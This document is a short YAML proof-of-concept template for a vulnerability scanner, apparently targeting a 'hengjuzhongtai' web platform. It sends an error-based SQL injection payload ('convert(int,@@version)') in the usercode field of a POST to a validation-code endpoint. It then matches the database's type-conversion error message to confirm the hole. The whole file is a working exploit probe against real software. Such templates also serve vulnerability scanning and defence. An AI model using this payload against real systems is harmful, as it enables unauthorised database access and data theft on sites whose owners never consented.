name: poc-yaml-hengjuzhongtai-data-sql
transport: http
  
rules:
  r0:
    request:
      method: POST
      path: /sysplat/dataget/data.ashx?type=sendvalidatecode
      headers:
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Connection: close 

      body: "usercode=1' and 1=(convert(int,@@version))--&&mobile=" 
    expression: response.status == 200 && response.body.bcontains(b'转换成数据类型 int 时失败')
expression: r0()

